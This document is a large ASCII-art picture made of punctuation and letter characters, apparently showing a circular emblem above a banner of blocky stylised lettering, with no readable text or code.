::::::::::::::::::::::::::::::::::::::::::::::::...::...!&@&P5555555P55555555555555555P5P#@@J...:..:::::::::::::::::::[email protected]@#Y^..:^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^..^[email protected]&5~...:::::::::::::::::::::::::::...:[email protected]@#P555555555555555555555555555P5P&@&~.::.:..::.:.....5##G:..............Y##G^.......:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::[email protected]@B5555555555555555555555555555P&@&!.:...::::::::::.:::::::......~5&@@GJ^...^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^:..:?G&@@@#?^....:::::::::::::::::::::::::::...~#@&[email protected]@5.:.::...::..?BGGG&@@&GGGGGGGGGGGGGGG#@@@BGGGB!...::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......:.:.~&@&P5555555555555555555555555555G&@B^..:.::::::::::..:.....:....^?P&@@@@@#Y!:  .:^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^:[email protected]@@@@@@@@&5!:....::..:::::::::::::::::::.:.^[email protected]&G55P5555555555555555555555555P5P&@&~....:..::[email protected]@#[email protected]@&5JYYY~..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@[email protected]@G:.::.:::::::..:......:..:7P&@@@@@#GG#@@&BY7^. ..:^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^:.. .:!JG&@@#[email protected]@@@@@@@@G?^......::::::::::::::::::...:[email protected]@[email protected]@5...::.:::::::[email protected]@#[email protected]@#^ ......:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.~#@&P5P55555555555555555555555555P#@@Y...:::::::::.........^Y#@@@@&BPJ7777J5G#@@@#GY7~:.  .::^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^::.  .:^!JP#&@&&BY?7777JP&@@@@@@@@#5~....::::.::::::::::.:.:[email protected]@#P55P5555555555555555555555555P5P&@#^...::::::::::[email protected]@&BBBBBBBBBBBBBBB#@@#^..:....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::.:.:[email protected]@#P555555555555555555555555P5PPP#@@J..:::::::::..:....~5&@@@@#PJ7777777?JYPBB#&&@@@&BPY?!^:.  ...::^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^::...   .:~7JPB#@@@@##BBGGG5?77777?5#@@@@@@@@&P!...::.:::::::::::.:...?&@#P5P5555555555555555555555555555P#@@?..:.::::::::::[email protected]@#[email protected]@#^..::...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@G5555P55555555555555555555PPP5P#@@Y..:..::.:::.:..~5&@@@@[email protected]@@@@@@@@&#G5Y?!~::.    ...::::^^^^^^~~~~~~~~~~~~~~~~~~~~~^^^^^^::::...     .:^~7?YPB#&@@@@@@@@@@BGBBBBBBBPJ777777YG&@@@@@@@&G7...:::::.:...:::[email protected]@#P5P55555555555555555555555555555G&@G:.:::::::::.::[email protected]@&BB##########BBB&@@#^.......:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..~#@&G5PP55555555555555555555555PP5P#@@5:.::.....:..^Y&@@@@GJ7777777J5PPPPPGBBBBBB&@@@@&#@@@@@&@@@@@&&#BG5Y?7!~^^::....                       ....::^^~!7?JYPG#&&@@@@@&&&@@@@@&&@@@@@BBBBBBBBBBPY?77777JG&@@@@@@@@G!...:[email protected]@#P5P5555555555555555555555555P5P5G&@#~.::::::::::[email protected]@#[email protected]@#?!!!!!^.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P5P555555555555555555555555555P#@@5:........:?#@@@@BJ777777?J5PPPPPPPGBBBBB&@@@@&J7Y#@@@&#BBB###&&B#&@@@@@@&&##BBGGGPPP55555555555PPPGGBBB##&&&@@@@@@@&GYJP##BBBB#&@@@&#BB&@@@@&BBBBBBBBBBBGY?77777?P&@@@@@@@@G!..:.......:[email protected]@#P5P555555555555555555555555555P5P#@&?..::::::::.::[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@?..::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P555555555555555555555555555P5P#@@P^..:[email protected]@@@#Y777777?YPPPPPPPPPPGBBBG#@@@@@Y7777P&@@@&BGBBBBGJ:[email protected]@@@&BBB###&&&&&&&&&&&&&&&&&&&&&####BBBB#@@@@#?. .JGBBBBB&@@@@#BGBBB&@@@@#BBBBBBBBBBBBGY?77777?5&@@@@@@@@P!..:..:...:[email protected]@#P555555555555555555555555555555PP#@@Y..:::::::::::...^!!!~~75&@@&57~7JJJ7!!J#@@@BJ7~~!!!^.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::..:[email protected]@B55555555555555555555555555P555PB&@B!....?&@@@@[email protected]@@@@G777777P&@@@@#BBBBBBG7. [email protected]@@&#GPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPG&@@@&J. .7GBBBBB#@@@@&[email protected]@@@@BGBBBBBBBBBBBBGY?77777?5&@@@@@@@&P~..:.:[email protected]&[email protected]@P:...:::::::::::.....:75#@@#5!^::?&&@J:::^?B&@@BY!:. ..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:...^[email protected]&B5555555555555555555555P555P5P55G&@&J.:[email protected]@@@&Y777777?5PPPPPPPPPPPPPGBBB&@@@@#?77777JPPB&@@@@#BBBBBBP!  [email protected]@@@#GPPPPPPPPPPPPPPPPPPPPPPPPPPG&@@@&Y: .7PBBBBB#@@@@&BBBBBBBBBB#@@@@&BBBBBBBBBBBBBBGPY?77777?5&@@@@@@@&Y^...?&@&G555555555555555555555555555555555B&@G:...:.:::::::..:::~?P&@@#[email protected]@&&@@&@@@@@@@&&&&&[email protected]@@#GY7~.::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:::[email protected]&G5P555P5555555555555555555555555P#@@[email protected]@@@B?777777YPPPPPPPPPPPPPPGBBG#@@@@@Y77777?PPPPPB&@@@@#BBBBBBP!  [email protected]@@@#GPPPPPPPPPPPPPPPPPPPPPPB&@@@&5^  !PBBBBB#&@@@&#[email protected]@@@@#GBBBBBBBBBBBBGPPPY?77777?P&@@@@@@@#?^[email protected]@#P5PP5555555555555555555555555P5P55G&@B~...:..:::::::::.:5&@&GY!::[email protected]@@PJJJJJJ?:.~JP#@@#7.::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:.~#@&G5PP55555555555555555555555555P5PB&@@@@@B?77777?5PPPPPPPPPPPPPPGBBBB&@@@@G777777YPPPPPPPB&@@@&#BBBBBBP!  [email protected]@@@#GPPPPPPPPPPPPPPPPPPB&@@@&5^  ~5BBBBB#&@@@@#BGBBBBBBBBBBBG#@@@@@[email protected]@@@@@@&#@&BP555555555555555555555555555555PP5G&@B~.......:::::::.:..:7!!^^^^^^^^^^^:J&@@J:^^^^^^^^^^^~!7^.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........~#@&G55555555555555555555555555555P55G#@@@G777777JPPPPPPPPPPPPPPGBBBBG#@@@@&J77777?PPPPPPPPPPB&@@@&#BBBBBBP7. ~P&@@@&BPPPPPPPPPPPPPPB&@@@&Y^  ~5BBBBBB&@@@@#BGBBBBBBBBBBBBBBB&@@@@&BBBBBBBBBBBBBGPPPPPPJ777777Y#@@@@@@@#G5P555555555555555555555555555555P5G&@B~.:.....:::::::::.:...:[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@&7..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]&B555555555555555555555555555P55P5PB&@[email protected]@@@@P777777YPPPPPPPPPPPPB&@@@@#BBBBBBP7. ^Y&@@@&BGPPPPPPPPGB&@@@#Y:  ~5BBBBBB&@@@@#BGBBBBBBBBBBBBBBBBG#@@@@@BBBBBBBBBBBBBBPPPPPPP5?7777775&@@@&BP555555P555555555555555555555555555B&@B~..::....:::::::::.....:7??????????????????????????????^...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:..:.^[email protected]&B55P555555555555555555555555P555P5P#&BJ77JPPPPPPPPPPPGGBBBBBBBB#@@@@&J77777?PPPPPPPPPPPPPPPB&@@@@#BBBBBBG?: [email protected]@@@#GPPPPG#&@@@#J:  ~5BBBBBB&@@@@#[email protected]@@@@&[email protected]#P55P55555555555555555555555555555P55B&@G^.::.......::::::::.........................................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::::.:.:.^[email protected]@BP5P555555555555555555555555555PP55G&&YJPPPPPPPPGGGBBBBBBBBBBB&@@@@B777777YPPPPPPPPPPPPPPPPPB&@@@@&BBBBBBGY^  [email protected]@@@&BB#@@@@B7. .!5BBBBB#&@@@@#GPPPPGBBBBBBBBBBBBBBBBBB#@@@@@BBBBBB[email protected]@P^.:.:..:..:::::::::::::::..::.:...::::::::::::::::::::::::.:::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.:[email protected]@#P5555555555555555555555555555PPPP5PG##GGGGGGGBBBBBBBBBBBBBG#@@@@@Y77777?PPPPPPPPPPPPPPPPPPPPB&@@@@&#BBBBBB5!  ^Y&@@@@@@@P!  .7PBBBBB#&@@@@#[email protected]@@@@#BBBBBBBBBBBBBGPPPPPPPPPPJ7JPGP55555555555555555555555555555555555P#@@5:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..?&@&G5555555555555555555555555555555555PB###BBBBBBBBBBBBBBBBBG&@@@@#?77777JPPPPPPPPPPPPPPPPPPPPPPG#@@@@&#BBBBBBP7: [email protected]@#Y^  :?PBBBBB#&@@@&#GPPPPPPPPGBBBBBBBBBBBBBBBBBBB&@@@@&BBBBBBBBBBBBBBGPPPPPPPPPGPGP55P555555555555555555555555555555555G&@&?...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..!#@&B55555555555555555555555555555555P55PG#&&BBGBBBBBBBBBBBBB&@@@@G7777775PPPPPPPPPPPPPPPPPPPPPPPPG#&@@@@#BBBBBBGJ^  ^~.  ^JGBBBBB#&@@@&BGPPPPPPPPPPGBBBBBBBBBBBBBBBBBBG#@@@@@BGBBBBBBBBBBBBBGPPPPPPGBGP5P5555555555555555555555555555555555PB&@B!.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......^[email protected]@#P55P55555555555555555555555555555555PG#&&##[email protected]@@@@57777775PPPPPPPPPPPPPPPPPPPPPPPPPPGB&@@@@&#BBBBBB5!. .!5BBBBBB&@@@@&[email protected]@@@@@#BBBBBBBBBBBBBBGGPGBBGP5555555555555555555555555555555555555P#@@P^.:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........?&@&G55P5555555555555555555555555555555P5PG#&@@&#BGBBBBBG#@@@@&?77777?PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPG#@@@@@#BBBBBBG5PBBBBB#&@@@@&BPPPPPPPPPPPPPPPGBBBBBBBBBBBBBBBBBBBB&@@@@@@&BBBBBBBBBBBBBBBBBGP55555555555555555555555555555555555P55G&@&?..:....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P55555555555555555555555555555P555P555PB#@@&#BGBBBG&@@@@B777777YPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPG#@@@@&&BBBBBBBBBBBBBB#&@@@@@#GPPPPPPPPPPPPPPBBBBBBBBBBBBBBBBBBBBB&@@@@@@@@&BBBBBBBBBB##BP55P555555555555555555555555555555555PP5P#@@G~..:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:.:J&@&GP55P5555555555555555555555555P55555P55PG#&@&#[email protected]@@@@G777777YPPPPPPPPPPPPPPPPPPPPPPPPPPPG#&@@@&P7:^JBBBBBBBBBBBBBP^^[email protected]@@@&#GPPPPPPPPPPGBBBBBBBBBBBBBBBBBBBBG#@@@@@@@@@@&BGBBBB#BGP55555555555555555555555555555555555P5P55G&@#J:...:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]@#G555555555555555555555555555555555P5P555PG#&@&@@@@@@@5777777YPPPPPPPPPPPPPPPPPPPPPPPPG#&@@@@G?:  .~YBBBBBBBBBBBBBG?^  ^[email protected]@@@&#[email protected]@@@@@&@@@@@&&&#GPP5555555555555555555555555555555555555555G#@@P~....:.......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:...:[email protected]@BP5555555555555555555555555555555555555555PG#&@@@@@@Y777777YPPPPPPPPPPPPPPPPPPPPPGB&@@@@BY^   ^JPBBBBB#&@@@&#BBBBBB57:  ~Y#@@@@&[email protected]@@@@@[email protected]@@&#[email protected]@B7...:.:...:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::...:J&@&BP55555555555555555555555555555555555555555PG#&@@@J777777YPPPPPPPPPPPPPPPPPPG#&@@@@#Y~.  :75BBBBBB#&@@@@@@@&#BBBBBBGY!.  ~5#@@@@&#BBGBBBBBBBBBBBBBBBBBBBBBB&@@@@@&&&#GP5555555555555555555555555555555555555P55555PB&@&J:...:.:.:::::..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:..~5&@&GP5PP555555555555555555555555555555555555555PGB#BGY?777JPPPPPPPPPPPPPPPG#&@@@@#5!.  :!5GBBBBB#&@@@@&BB#&@@@@&#BBBBBBGY~. .!5#@@@@&#BBGBBBBBBBBBBBBBBBBBGB&@@@&#BGP555555555555555555555555555555555555555555P5PG&@&5~...:.:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@&GP5555P555555555555555555555555555555555555555PBBBPY??PPPPPPPPPPPPG#&@@@@#Y!.  .!YGBBBBB#&@@@@&#GPPPPPG#&@@@@&#BBBBBBPJ~  .!5#@@@@&#BBGBBBBBBBBBBBBBB#&&#BGP5555555555555555555555555555555555555555555PP5PG#@@P~..:...:..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:[email protected]@&GP55P55555555555555555555555555555555555P555555PPGG5GGPPPPPPGB#&@@@@BY~.  .!YGBBBBB#&@@@@@#BGPPPPPPPPPPB#@@@@@&#BBBBBBPJ~  .!5#@@@@&#BBGGBBBBB##&&#BGPP55555555555555555555555555555555555555555555PPPPG&@@P!...:...:..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:.:.::[email protected]@&BP55555P55555555555555555555555555555555555555555PPPGGBBB#&@&##GJ^   .!YGBBBBB#&@@@@@&BGPPPPPPPPPPPPPPPGB#@@@@@&#BBBBBBPJ~  .~YB&@@@&&##&&&&#BGP55555555555555555555555555555555555555555P55555555PG&@&P!...:........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..!P&@&BP55555P55555555555555555555555555555555555555555P55PPGGBBBG5J!!^~JGBBBBB#&@@@@@&BGPPPPPPPPPPPPPPPPPPPPPGB&@@@@@&#BBBBBBPJ~..~Y&@&&&#BGGPP55555P555555555555555555555555555555555555555555PP55PB&@&P!...::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.:..~Y&@&#G55555PP55555555555555555555555555555555555555555555555PPGBB#B##BBB##&&&&&&BGPPPPPPPPPPPPPPPPPPPPPPPPPPPGB&@@@@@&#BB###&BB#BBGGPP555555555555555555555555555555555555555555555555555P555PG#&@#Y~....:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.........^[email protected]@#GP555P55555555555555555555555555555555555555555555555555555PPPPGGBBBBB#############BBBBBBBBGGGGGGGGBBBBBB#&&&&&#BBBGGPPPP5555555555555555555555555555555555555555555555555555555P555PG#@@BJ^.........::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:....:7P&@&BGP5555P5555555555555555555555555555555555555555555555P555555555555PPPPGGGGBBB###################BBBBGGGPPPPPP5555555555P55P555555555555555555555555555555555555555555555555555PGB&@&P7:..::......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:...:::.....^[email protected]@#BP55P55555555555555P555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P55PB#@@BJ^...:...:::..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:...:!5#@@#GP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PG#@@#5!:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:....^?P&@&#GP5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PP555555PG#&@&P7^........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::::::.......:....^?P&@&#BP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PB#&@&P?^...:..:.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....::.::...............::.::.....^?P#@@&BGP5555PP5555P55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P55555555555555555555PGB&@@#P?^.......:......::::::::::::::::::::::........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......::...:^^~~~~~~~~^::....:........:75B&@&#GPP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P5555555P555555PP555PPPPPPPPPPPPPPG#&@@BY7^............................................:..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:?P#&&@@@@@@@&&#GJ~............  .~?P#&&#BGPP5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PG#&&&@@@@@@@@&&&@&P?~................................................::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:..:[email protected]@@&#########&@@@&GPGGGGGGGP5YJYPPPPB&@@@@&&BGPP55555555PGBB########################BBGGB##########BGPPPGB###BBGPPPGB##########BBBB##############BBBB##########&@@@&#########&@@@&PPPPGGGGGPP5J77J5PGGGGGGGGPYJ~^7J5PGGGGGGGP5J7^...:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:[email protected]@@@G^^^^^^^^~~^[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#BGPP5G#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&@@@@@@@@&#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G^^^^^^^^^~^[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#@@@@@@@@@@@@@@@#5^.:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@&5?: [email protected]@@&PB&@@&#&@@&[email protected]&[email protected]@@@&5?77Y#@@@@@G?777777777JBGJ7777777777777?Y##J777777777?P5?: YPPPPPPP5..!7777777777777JG&@&Y777777777?5&@@@#[email protected]@@G:....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:..:[email protected]@@Y ~YYPPPPPPPPPYYJJJJJJJJJJJJ?.^!.7JJJJJJJ7.~&@@&~.^[email protected]@@&7.!JJJJJJJJJJJJJJJJJJJJJJJ?^:PY !JJJJJJJJ.:#@&5~:!J7:^[email protected]@@@^.JJJJJJJJ? ~^:?JJJJJJJJJJJJ! J? 7JJJJJJJJ.  [email protected] !JJJJJJJY^ [email protected]@&! 7JJJJJJJ7.~&@@&!.:..:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.^&@@@! JPPPPPPPPPPPPPPPPPPPPPPPPG?.!.:5PPPPPPGJ [email protected]@@#^[email protected]@@Y 7GPPPPPPPPPPPPPPPPPPPPPPPGY ~! YPPPPPPPP.^#Y^:!5PPP5!.7#@B.^PPPPPPPP? ^.!PPPPPPPPPPPPG! Y~.YPPPPPPPY. .JPPPPPPPPPPPPPPPPPPPPPPPPPPGP::#J ?GPPPPPPP^.#@@#::5PPPPPPGJ [email protected]@@#~.:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@&^.5PPPPPPPPPPPPPPPPPPPPPPPPG7 ? ~GPPPPPPG7 [email protected]@@G....~&@@@! JPPPPPPPPPPPPPPPPPPPPPPPPP? !^:5PPPPPPPJ.:^:75GPPPPPPY^:GP !PPPPPPPP~.~ ?PPPPPPPPPPPPG~ 5:^5PPPPPPG?  :5PPPPPPPPPPPPPPPPPPPPPPPPPPP5:^#~.YPPPPPPPY.~&@@G ~GPPPPPPG7 [email protected]@@B..:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@B.^PPPPPPPPPPPPPPPPPPPPPPPPPP~.7 !GPPPPPPP^[email protected]@@[email protected]@@&:.5PPPPPPPPPPPPPPPPPPPPPPPPG! 7 ~PPPPPPPG7 :75PPPPPPPPPY^.PJ JGPPPPPPP^.~.JGPPPPPPPPPPP5::5 !GPPPPPPG7  ^PPPPPPPPPPPPPPPPPPPPPPPPPPPGY.!&.^PPPPPPPGJ [email protected]@@Y !GPPPPPPP~ [email protected]@@5.:..::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@G::?JPPPPPPPPPJ?????????????7.~~ YPPPPPPP5:^&@@@7.:[email protected]@@B.^PPPPPPPP5J?????JJ5PPPPPPPP^ ? 7GPPPPPPP??5PPPPPPPGPY~:?B&~.YPPPPPPPY:^~.7??JYPPPPPPPGY.!J ?PPPPPPPP^:.:?JPPPPPPPPPJ??????J5PPPPPPPP7 YG ~PPPPPPPP7 [email protected]@@7 JPPPPPPP5::#@@@?......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@BJ.:PPPPPPPPJ ~???????JJJJ?JPB^.5PPPPPPPY [email protected]@@@[email protected]@@5 !PPPPPPPG!.7J?J?:.JGPPPPPP5:^! ?PPPPPPPPPPPPPPPPPPJ~:[email protected]@#::5PPPPPPG? ?#5JJ! ~PPPPPPPG? J!.YPPPPPPP5.~PJ.:PPPPPPPPJ ~????~ 7PPPPPPPG~ GJ 7PPPPPPPP:[email protected]@&^[email protected]@@@~......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.^[email protected]@@P7~.~PPPPPPPP!.^!!!!!!!7Y&@@B7~.~PPPPPPPP7.^[email protected]@@B:.:#@@@? JGPPPPPPP^.#@@@@::5PPPPPPGJ !:.5PPPPPPPPPPPPPPPPJ~..^7Y#@G ~GPPPPPPG7 [email protected]@@@5 !GPPPPPPP~.5::PPPPPPPPY [email protected]~PPPPPPPP! ^!!!!^:JPPPPPPPP^.#! YPPPPPPPP.:&@@B.^PPPPPPPP7 [email protected]@@#:......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@&::Y55PPPPPPPP55YYYYYYYY^ [email protected]&^.Y55PPPPPPPP55J [email protected]@@&~.!&@@&~.YPPPPPPPY.~&@@@B.^PPPPPPPG? 7::PPPPPPPPPPPPPPPPP5Y55Y?:^#Y 7GPPPPPPP^[email protected]@@@7 JPPPPPPPP::5.^PPPPPPPP7 [email protected] ?GPPPPPPP~!YYYYYY5PPPPPPPGJ.!#^.5PPPPPPPJ [email protected]@@5 !PPPPPPPG~ [email protected]@@P:......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@P.~GPPPPPPPPPPPPPPPPPPPP^.#@B.:PPPPPPPPPPPPPJ [email protected]@@@[email protected]@@#.^PPPPPPPG? [email protected]@@@Y !PPPPPPPP~.7.~PPPPPPPPPPPPPPPPPPPPPPG! 57 JGPPPPPP5::#@@@&~.YPPPPPPP5.~Y [email protected]!.YPPPPPPP5^JGPPPPPPPPPPPPPY:.BB ~PPPPPPPG7 [email protected]@@J ?PPPPPPPP^.#@@@J......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@Y [email protected]@P ~PPPPPPPPPPPPP! [email protected]@@@@@@@@@G ~GPPPPPPP! [email protected]@@@7 JPPPPPPPP::7 JGPPPPPPPPPPPPPPPPPPPPPP~ P^.5PPPPPPPY [email protected]@@@#.:5PPPPPPG? ?7 JGPPPPPPP::&&::5PPPPPPPJ:YPPPPPPPPPPPPPP5:.B5 7GPPPPPPP! [email protected]@@~.JPPPPPPPY.^&@@&!......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@B!^:!GPPPPPPG?:^^^^^^^^^^[email protected]@#!^:!PPPPPPPGJ::[email protected] 7GPPPPPPP^[email protected]@@&~.YPPPPPPPY.^!.YGPPPPPPY^^^^^^YPPPPPPPP:.G.^PPPPPPPG7 [email protected]@@@P !GPPPPPPG7 [email protected] ~GPPPPPPG7 ^^^^^^:YPPPPPPPP:.B? ?GPPPPPP5::#@@&.^PPPPPPPGJ [email protected]@@&7......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
